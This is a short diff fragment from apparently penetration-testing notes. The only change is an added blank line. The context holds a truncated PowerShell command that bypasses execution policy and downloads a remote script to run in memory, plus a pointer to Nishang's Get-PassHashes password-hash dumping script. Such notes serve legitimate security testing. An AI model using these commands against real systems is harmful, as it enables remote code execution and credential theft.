@@ -20,3 +20,4 @@ powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 Dump hashes if you have admin privilege
 
 https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
+
